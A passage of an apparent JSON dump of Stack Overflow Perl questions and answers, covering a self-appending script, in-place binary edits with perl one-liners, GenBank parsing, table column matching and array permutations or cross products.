\"print \\\"It works!!\\\\n\\\";\\n\";\n</code></pre>\n\n<p>This program adds the line</p>\n\n<pre><code>print \"It works!!\\n\";\n</code></pre>\n\n<p>to the end of it's own source file, and I hoped that once that line was added, it would then execute and output \"It works!!\"</p>\n\n<p>Well, it does correctly append the line to the source file, but it doesn't execute it then and there.</p>\n\n<p>So I assume therefore that when perl executes a program that it loads it to memory and runs it from there, but my question is, is there a way to access this loaded version of the program so you can have a program that can alter itself as you run it?</p>\n"}, {"tags": ["perl", "shell", "command-line", "floating-point", "binary-data"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1462669804, "last_edit_date": 1462669804, "creation_date": 1462668167, "answer_id": 37095076, "question_id": 37095026, "link": "https://stackoverflow.com/questions/37095026/how-to-change-double-value-at-specific-offset-in-the-file-from-shell-script/37095076#37095076", "title": "How to change double value at specific offset in the file from shell script?", "body": "<pre><code>perl -i -0777pe'my @n = unpack(\"d5\", $_); $n[4] = 0.008; $_ = pack(\"d5\", @n);' file.bin\n</code></pre>\n\n<p>-or-</p>\n\n<pre><code>perl -i -0777pe'substr($_, 4*8, 8, pack(\"d\", 0.008))' file.bin\n</code></pre>\n\n<p>Where:</p>\n\n<ul>\n<li><code>-i</code> - make change directly in the file,</li>\n<li><code>-0777</code> - changes the line separator to <code>undef</code>, allowing to slurp the file by feeding all the lines to Perl in one go,</li>\n<li><code>-p</code> - places a printing loop around your command,</li>\n<li><code>-e '...'</code> - allows you to provide the program from the argument</li>\n</ul>\n"}], "owner": {"reputation": 116828, "user_id": 55075, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/8bbc94977312d285045b2412257b6cb8?s=128&d=identicon&r=PG", "display_name": "kenorb", "link": "https://stackoverflow.com/users/55075/kenorb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 37095076, "answer_count": 1, "score": 1, "last_activity_date": 1462671827, "creation_date": 1462667504, "last_edit_date": 1495540780, "question_id": 37095026, "link": "https://stackoverflow.com/questions/37095026/how-to-change-double-value-at-specific-offset-in-the-file-from-shell-script", "title": "How to change double value at specific offset in the file from shell script?", "body": "<p>I've got 5 double values stored in binary file, in the following way:</p>\n\n<pre><code>perl -e \"print pack('d5', (0.001, 0.002, 0.003, 0.004, 0.005))\" &gt; file.bin\n</code></pre>\n\n<p>and I'd like to change 5th value from <code>0.005</code> into <code>0.008</code> in the already existing file.</p>\n\n<p>I'm aware that I can <a href=\"https://stackoverflow.com/a/36794412/55075\">read the double</a> by using GNU <code>od</code>, like:</p>\n\n<pre><code>$ od -F -An -j32 -N8 file.bin | xargs\n0.005\n</code></pre>\n\n<p>but how can I modify one of these values in a simple way in shell?</p>\n\n<p>Does GNU <code>od</code> has ability to change it, or I've to use other utilities (like <code>xxd</code>), or I should use perl?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 19, "user_id": 6295895, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1053659371336814/picture?type=large", "display_name": "Tomb", "link": "https://stackoverflow.com/users/6295895/tomb"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462651227, "post_id": 37092972, "comment_id": 61729903, "body": "I put use strict and warnings. What part is badly indented ? I don&#39;t know cause this kind of error didnt show"}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1462651260, "post_id": 37092972, "comment_id": 61729912, "body": "Is <code>@gbfiles</code> an array of (multiline) records or of (single) lines?"}, {"owner": {"reputation": 19, "user_id": 6295895, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1053659371336814/picture?type=large", "display_name": "Tomb", "link": "https://stackoverflow.com/users/6295895/tomb"}, "edited": false, "score": 0, "creation_date": 1462651343, "post_id": 37092972, "comment_id": 61729948, "body": "yes, I tried to split it all in multiline strings"}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1462651430, "post_id": 37092972, "comment_id": 61729971, "body": "The for loop you want to insert <code>&quot;for my $line (@gbfiles)&quot;</code> seems to indicate that <code>@gbfiles</code> now contains single lines?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462654242, "post_id": 37092972, "comment_id": 61730829, "body": "I&#39;ve tidied your Perl code. I&#39;ve also run it against the data that you show. It doesn&#39;t produce the output you say but dies because there is no <i>molecule type</i> information in the data that you show. If you make us keep begging you for scraps of information then you are unlikely to get a useful answer. Please read <a href=\"http://stackoverflow.com/help/mcve\"><i>How to create a Minimal, Complete, and Verifiable example</i></a> and come back with something that we can run to obtain the same results as you. By now that should probably be in a new question"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 1, "creation_date": 1462659089, "post_id": 37092972, "comment_id": 61732101, "body": "@H&#229;konH&#230;gland: The statement <code>my $record = $gbfiles[$i]</code> implies that <code>@gbfiles</code> contains GenBank <i>records</i>. (Making <code>@gbfiles</code> a <i>dreadful</i> identifier!)  And because <code>@gbfiles</code> has been created from <code>split( &#47;\\&#47;\\&#47;\\s*&#47;s, $gbfile )</code> I doubt if those records are single lines of text. We really need a <i>lot</i> more information"}], "answers": [{"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": true, "score": 1, "last_activity_date": 1462665289, "last_edit_date": 1462665289, "creation_date": 1462664265, "answer_id": 37094744, "question_id": 37092972, "link": "https://stackoverflow.com/questions/37092972/parsing-a-genbank-file/37094744#37094744", "title": "Parsing a GenBank file", "body": "<p>If you have access to <a href=\"http://bioperl.org/howtos/Beginners_HOWTO.html#item13\" rel=\"nofollow\">Bio Perl</a>, you might find a solution such as the following.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Bio::SeqIO;\n\nmy $in  = Bio::SeqIO-&gt;new( -file   =&gt; \"input.txt\",\n                           -format =&gt; 'GenBank');\n\nwhile ( my $seq = $in-&gt;next_seq ) {\n    my $acc = $seq-&gt;accession;\n    my $length = $seq-&gt;length;\n    my $definition = $seq-&gt;desc;\n    my $type = $seq-&gt;molecule;\n    my $organism = $seq-&gt;species-&gt;binomial;\n\n    if ($type eq 'mRNA'              &amp;&amp;\n        $organism =~ /homo sapiens/i &amp;&amp;\n        $acc =~ /[A-Za-z]{2}_[0-9]{6,}/ )\n    {\n        print \"$acc | $definition | $length\\n\";\n        print $seq-&gt;seq, \"\\n\";\n        print \"\\n\";\n    }\n}\n</code></pre>\n\n<p>I was able to capture the 5 variables from a sample GenBank file I have (input.txt). It should simplify your code.</p>\n"}], "owner": {"reputation": 19, "user_id": 6295895, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/1053659371336814/picture?type=large", "display_name": "Tomb", "link": "https://stackoverflow.com/users/6295895/tomb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 282, "favorite_count": 0, "accepted_answer_id": 37094744, "answer_count": 1, "score": -1, "last_activity_date": 1462808897, "creation_date": 1462650368, "last_edit_date": 1462808897, "question_id": 37092972, "link": "https://stackoverflow.com/questions/37092972/parsing-a-genbank-file", "title": "Parsing a GenBank file", "body": "<p>I trying to parse a GenBank file so I could get the accession number, the definition, the size of the file and the DNA sequence</p>\n\n<p>Is there a way to modify my code and make it shorter and just declare all the variables at once like they do in the book and parse the file in one or two blocks of code?</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462644501, "post_id": 37091813, "comment_id": 61727655, "body": "Nice. I had a similar idea with <a href=\"http://perldoc.perl.org/perldata.html#Multi-dimensional-array-emulation\" rel=\"nofollow noreferrer\">multidimensional arrays</a> instead and wanted to make e.g. <code>join($;, &quot;a=1&quot; &quot;b=1&quot;, &quot;c=1&quot;, &quot;d=1&quot;)</code> the lookup hash&#39;s key and <code>{e=&gt;$e, f=&gt;$f}</code> its value and then simply use <code>exists</code> to find the matches."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462644696, "post_id": 37091813, "comment_id": 61727718, "body": "I was a bit ambivalent about using arrays vs. hashes for the first - just for the sake of consistency if nothing else."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1462645074, "post_id": 37091813, "comment_id": 61727826, "body": "Same for me. I also was unsure (and still am), but, hey, this is Perl! TISMTOWTDI (or however this acronym is spelled). :-)"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 2, "last_activity_date": 1462645389, "last_edit_date": 1462645389, "creation_date": 1462643290, "answer_id": 37091813, "question_id": 37088469, "link": "https://stackoverflow.com/questions/37088469/perl-match-multiple-column-names-in-two-files/37091813#37091813", "title": "perl match multiple column names in two files", "body": "<p>The trick here would be to read your first data into a hash, and key the 'data' with the 'lookup'.</p>\n\n<p>Then, run through the reference table - you an use a hash slice, so you can look up by named keys. If present; print. If not, replace with the desired result.\nE.g. something like this:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nuse Data::Dumper;\n\nopen( my $table1, '&lt;', 'data1.txt' ) or die $!;\nopen( my $table2, '&lt;', 'data2.txt' ) or die $!;\n\nchomp( my @header = split /\\t/, &lt;$table2&gt; );\nmy %lookup;\nwhile (&lt;$table2&gt;) {\n   print;\n   chomp;\n   my @row = split /\\t/;\n   #put values into lookup hash, keying on 4 values, to retrieve 'e' and 'f'\n   #could do this like the below, if you wanted to use named values. \n   $lookup{ $row[0] }{ $row[1] }{ $row[2] }{ $row[3] } = [ $row[4], $row[5] ];\n}\nprint Dumper \\%lookup;\n\n#read one line - the header row - and split it into an array.\nchomp( my @header_for_table1 = split /\\t/, &lt;$table1&gt; );\nprint join \"\\t\", @header_for_table1, \"e\", \"f\", \"\\n\";\nwhile (&lt;$table1&gt;) {\n   chomp;\n   my %row;\n   @row{@header_for_table1} = split /\\t/;\n   print join ( \"\\t\", @row{@header_for_table1},\n                      @{ $lookup{ $row{a} }{ $row{b} }{ $row{c} }{ $row{d} }\n                           // [ \"empty\", \"empty\" ] }), \"\\n\";\n}\n</code></pre>\n\n<p>Note <code>//</code> operator is perl 5.10+. You can use <code>||</code> in this case, but be slightly more cautious if you might have zero or empty strings stored. (because <code>0</code> is false, but is defined, which is different). </p>\n"}], "owner": {"reputation": 1773, "user_id": 1987607, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/e317b170bca0054580ef85f7a6469de6?s=128&d=identicon&r=PG&f=1", "display_name": "user1987607", "link": "https://stackoverflow.com/users/1987607/user1987607"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 402, "favorite_count": 0, "accepted_answer_id": 37091813, "answer_count": 1, "score": 0, "last_activity_date": 1462645389, "creation_date": 1462623668, "question_id": 37088469, "link": "https://stackoverflow.com/questions/37088469/perl-match-multiple-column-names-in-two-files", "title": "perl match multiple column names in two files", "body": "<p>I have two tab-delimited text files for which I want to match multiple columns.</p>\n\n<p>This is the structure of table 1. It can have a variable number of columns. So I want to use the header to make a match with table2</p>\n\n<pre><code>a    x    y    b    c    d   z\n1    .    .    1    1    1   .\n2    .    .    2    2    2   .\n3    .    .    6    6    3   .\n4    .    .    4    4    4   . \n</code></pre>\n\n<p>This is the structure of table2. Number of columns &amp; number of lines will always be the same. First line is a header</p>\n\n<pre><code>a   b   c   d   e   f\n1   1   1   1   yes  no\n2   2   2   2   no   no\n3   3   3   3   no   yes\n</code></pre>\n\n<p>Now if there is a match between the values in column a, b, c and d from both tables, I want to add two extra columns to table2, with the values of columns 'e' and 'f' from table2.</p>\n\n<p>I normally use perl for this &amp; work with hashes</p>\n\n<p>This is what I have</p>\n\n<pre><code>my %hash = ();\nwhile(&lt;$table2&gt;){\n    chomp;\n    my @cols = split(/\\t/);\n    my $keyfield = $cols[0];\n    my $keyfield2 = $cols[1];\n    my $keyfield3 = $cols[2];\n    my $keyfield4 = $cols[3];\n    push @{ $hash{$keyfield} }, $keyfield2, $keyfield3, $keyfield4;\n    }\nseek $table1,0,0; #cursor resetting\nwhile(&lt;$table1&gt;){\n    chomp;\n    my @cols = split(/\\t/); \n    my $keyfield = $cols[...]; #how can I make a match here based on the column names\n    if (exists($hash{$keyfield})){\n        print ... #how can I add two extra columns to the existing $table1?\n    }\n    else {\n        print ...\n    }\n}\n</code></pre>\n\n<p>So I have two questions:</p>\n\n<p>how can I make a match here based on the column names</p>\n\n<p>how can I add two extra columns to the existing $table1?</p>\n\n<p>The output should look like this:</p>\n\n<pre><code>a    x    y    b    c    d    z    e    f\n1    .    .    1    1    1    .    yes  no\n2    .    .    2    2    2    .    no   no\n3    .    .    6    6    3    .    'empty'    'empty'\n4    .    .    4    4    4    .    'empty'    'empty'\n</code></pre>\n\n<p>So $table1 has two extra columns, with the values from 'e' and 'f' when there is a match. And empty (so no value) when there is no match.</p>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1462589009, "post_id": 37083867, "comment_id": 61712375, "body": "show what output you want for your 1,2,3 / 4,5,6 / 7,8,9 example please, just to clarify what you want"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462636937, "post_id": 37083867, "comment_id": 61725012, "body": "<i>&quot;I am attempting to use List::Permutor to print the combinations&quot;</i> <code>List::Permutor</code> is for generating <i>permutations</i>. If you want <i>combinations</i> then you need a different module, perhaps <a href=\"https://metacpan.org/pod/Math::Combinatorics\" rel=\"nofollow noreferrer\">Math::Combinatorics</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462650089, "post_id": 37083867, "comment_id": 61729495, "body": "You started well with <i>&quot;For the sake of clarity, let&#39;s assume that  File1 contains...&quot;</i> but you never refer to that data again so there is no clarity! Please explain what you need in terms of that simplified data; then we will be able to help you"}], "answers": [{"comments": [{"owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "edited": false, "score": 0, "creation_date": 1462604447, "post_id": 37084922, "comment_id": 61715482, "body": "Aren&#39;t there 492,960 ways to permutate 80 items? ie 80 * 79 * 78.  And if he has 3 files with &quot;around 80+ items each&quot;, then isn&#39;t it 240 items being permutated?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "edited": false, "score": 0, "creation_date": 1462608710, "post_id": 37084922, "comment_id": 61716540, "body": "@Marty, No, there are P(80,80) = 80! = 80*79*78*77*76*..*1 = more than 7e118 ways to permute 80 items. /// He didn&#39;t say that each file had 80 items. /// But you bring up a third interpretation, which I&#39;ve added to my answer. (Though under that interpretation, there would be P(80,1)*P(80,1)*P(80,1)=80*80*80=512,000 results rather than 492,960  when there are 80 items in each file.)"}, {"owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "edited": false, "score": 0, "creation_date": 1462612327, "post_id": 37084922, "comment_id": 61717420, "body": "Of course.  For some reason I&#39;ve focused on there being 3 files and mixed it up with choosing 3 items from the collection.  Either way, I don&#39;t think the questioner will be printing them all out anytime soon.  ;-)"}, {"owner": {"reputation": 37, "user_id": 6302682, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207001893998327/picture?type=large", "display_name": "Sergio Saenz", "link": "https://stackoverflow.com/users/6302682/sergio-saenz"}, "edited": false, "score": 0, "creation_date": 1462652444, "post_id": 37084922, "comment_id": 61730289, "body": "Thank you everyone who has commented since I posted this question last night. To further clarify I would like the arrays to stay in that order (I just realized I didnt specify that earlier), but with the current code it prints the memory address locations, not the contents of the arrays. I am going to try some of the suggested code and will let you know if it works for me."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462652760, "post_id": 37084922, "comment_id": 61730390, "body": "That doesn&#39;t clarify anything. Please provide the output you desire."}, {"owner": {"reputation": 37, "user_id": 6302682, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207001893998327/picture?type=large", "display_name": "Sergio Saenz", "link": "https://stackoverflow.com/users/6302682/sergio-saenz"}, "edited": false, "score": 0, "creation_date": 1462652881, "post_id": 37084922, "comment_id": 61730427, "body": "So the last option is the closest to what I am looking for, though I had to change say to print as I got a weird declaration error. At the moment it is printing as one column with some weird concatenation of the words. I can probably puzzle out the formatting, so thank you."}, {"owner": {"reputation": 37, "user_id": 6302682, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207001893998327/picture?type=large", "display_name": "Sergio Saenz", "link": "https://stackoverflow.com/users/6302682/sergio-saenz"}, "edited": false, "score": 0, "creation_date": 1462652995, "post_id": 37084922, "comment_id": 61730463, "body": "Because many of you are wondering why I am doing this, I am putting together a source for a generator, so one line would be randomly picked and three attributes (one from each file) will be displayed. The number of lines in some of the files are actually closer to 200, though once I have it in text format obviously I wont have to recalculate it each time."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462653051, "post_id": 37084922, "comment_id": 61730480, "body": "You need to add <code>use feature qw( say );</code> to use <code>say</code>. Basics such as those, <code>use strict;</code> and <code>use warnings;</code> were omitted for brevity."}, {"owner": {"reputation": 37, "user_id": 6302682, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207001893998327/picture?type=large", "display_name": "Sergio Saenz", "link": "https://stackoverflow.com/users/6302682/sergio-saenz"}, "edited": false, "score": 0, "creation_date": 1462654636, "post_id": 37084922, "comment_id": 61730955, "body": "I just did it with print, no reason to do say if I have to enable the function. Only problem now is that the strings in the first file have spaces and special characters so if I chomp it the output is funny. If I dont chomp it, the newline remains a problem. So, I need to figure out how to clean it up, after it has gone through iterations/permutations but before the print command."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462655014, "post_id": 37084922, "comment_id": 61731031, "body": "There are no permutations in what you want to do."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1462608945, "last_edit_date": 1462608945, "creation_date": 1462599469, "answer_id": 37084922, "question_id": 37083867, "link": "https://stackoverflow.com/questions/37083867/print-all-possible-combinations-of-an-array-of-arrays/37084922#37084922", "title": "Print all possible combinations of an array of arrays", "body": "<p>It's not clear what you want.</p>\n\n<p>Note that all the provided output of the snippets below are for the following inputs:</p>\n\n<pre><code>my @app  = ( 1, 2, 3 );\nmy @att1 = ( 4, 5, 6 );\nmy @att2 = ( 7, 8, 9 );\n</code></pre>\n\n<hr>\n\n<p>If you want permutations of the arrays, your code works as-is.</p>\n\n<pre><code>use List::Permutor qw( );\n\nmy $permutor = List::Permutor-&gt;new( \\@app, \\@att1, \\@att2);\nwhile ( my @permutation = $permutor-&gt;next() ) {\n   say join \", \", map { \"[@$_]\" } @permutation;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>[1 2 3], [4 5 6], [7 8 9]\n[1 2 3], [7 8 9], [4 5 6]\n[4 5 6], [1 2 3], [7 8 9]\n[4 5 6], [7 8 9], [1 2 3]\n[7 8 9], [1 2 3], [4 5 6]\n[7 8 9], [4 5 6], [1 2 3]\n</code></pre>\n\n<hr>\n\n<p>If you want permutations of the contents of the arrays (regardless of the array from which a string originated), then you just need to create a list from the contents of the arrays.</p>\n\n<pre><code>use List::Permutor qw( );\n\nmy $permutor = List::Permutor-&gt;new( @app, @att1, @att2 );\nwhile ( my @permutation = $permutor-&gt;next() ) {\n   say \"@permutation\";\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>1 2 3 4 5 6 7 8 9\n1 2 3 4 5 6 7 9 8\n1 2 3 4 5 6 8 7 9\n1 2 3 4 5 6 8 9 7\n1 2 3 4 5 6 9 7 8\n1 2 3 4 5 6 9 8 7\n1 2 3 4 5 7 6 8 9\n1 2 3 4 5 7 6 9 8\n1 2 3 4 5 7 8 6 9\n1 2 3 4 5 7 8 9 6\n...\n9 8 7 6 5 4 3 2 1\n</code></pre>\n\n<p>Keep in mind that P(80) is 100,000,000,000,000,000,000,000,000,000,000,000,000 times the number of atoms in the observable universe. </p>\n\n<hr>\n\n<p>If you want all possible sets of a single element from each array, then you can use the following:</p>\n\n<pre><code>for my $app (@app) {\nfor my $att1 (@att1) {\nfor my $att2 (@att2) {\n   say \"$app $att1 $att2\";\n}}}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>use Algorithm::Loops qw( NestedLoops );\n\nmy $iter = NestedLoops([ \\@app, \\@att1, \\@att2 ]);\nwhile ( my ($app, $att1, $att2) = $iter-&gt;() ) {\n   say \"$app $att1 $att2\";\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>1 4 7\n1 4 8\n1 4 9\n1 5 7\n1 5 8\n1 5 9\n1 6 7\n1 6 8\n1 6 9\n2 4 7\n...\n3 6 9\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 37, "user_id": 6302682, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207001893998327/picture?type=large", "display_name": "Sergio Saenz", "link": "https://stackoverflow.com/users/6302682/sergio-saenz"}, "is_accepted": false, "score": 0, "last_activity_date": 1462664697, "creation_date": 1462664697, "answer_id": 37094788, "question_id": 37083867, "link": "https://stackoverflow.com/questions/37083867/print-all-possible-combinations-of-an-array-of-arrays/37094788#37094788", "title": "Print all possible combinations of an array of arrays", "body": "<p>I solved my last issue with formatting, by cheating. I just edited the source files and removed all the \\r and \\n. </p>\n\n<p>Final code:</p>\n\n<pre><code>use Algorithm::Loops qw( NestedLoops );\nuse warnings;\n\nopen (FILE, app_txt);\n ($app = (&lt;FILE&gt;));\nclose (FILE);\nmy @app = split /,/, $app;\n\nopen (FILE, att1_txt);\n ($att1 = (&lt;FILE&gt;));\nclose (FILE);\nmy @att1 = split /,/, $att1;\n\nopen (FILE, att2_txt);\n ($att2 = (&lt;FILE&gt;));\nclose (FILE);\nmy @att2= split /,/, $att2;\n\nmy $iter = NestedLoops([ \\@app, \\@att1, \\@att2 ]);\nwhile ( my ($app, $att1, $att2) = $iter-&gt;() ) {\n    open (my $fh, '&gt;', 'test');\n    print  $fh \"$app $att1 $att2\\n\";\n    close $fh;\n}\n\nprint \"done\\n\";\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 37, "user_id": 6302682, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207001893998327/picture?type=large", "display_name": "Sergio Saenz", "link": "https://stackoverflow.com/users/6302682/sergio-saenz"}, "edited": false, "score": 0, "creation_date": 1462683892, "post_id": 37095753, "comment_id": 61736092, "body": "Wow, this is literally what I wanted to do. Ill just save that one for next time. Thanks!"}], "tags": [], "owner": {"reputation": 121105, "user_id": 2766176, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/edd8638efe875601bfe394a8aea5b16d?s=128&d=identicon&r=PG", "display_name": "brian d foy", "link": "https://stackoverflow.com/users/2766176/brian-d-foy"}, "is_accepted": false, "score": 2, "last_activity_date": 1462676299, "creation_date": 1462676299, "answer_id": 37095753, "question_id": 37083867, "link": "https://stackoverflow.com/questions/37083867/print-all-possible-combinations-of-an-array-of-arrays/37095753#37095753", "title": "Print all possible combinations of an array of arrays", "body": "<p>I wrote <a href=\"http://www.metacpan.org/module/Set::CrossProduct\" rel=\"nofollow\">Set::CrossProduct</a> for this purpose.</p>\n"}], "owner": {"reputation": 37, "user_id": 6302682, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207001893998327/picture?type=large", "display_name": "Sergio Saenz", "link": "https://stackoverflow.com/users/6302682/sergio-saenz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 445, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1462676299, "creation_date": 1462588011, "last_edit_date": 1462649869, "question_id": 37083867, "link": "https://stackoverflow.com/questions/37083867/print-all-possible-combinations-of-an-array-of-arrays", "title": "Print all possible combinations of an array of arrays", "body": "<p>I want to take three files that each contain 80 or more lines of text and print all possible combinations of those three files.</p>\n\n<p>For the sake of clarity, let's assume that </p>\n\n<h3>File1 contains</h3>\n\n<pre class=\"lang-none 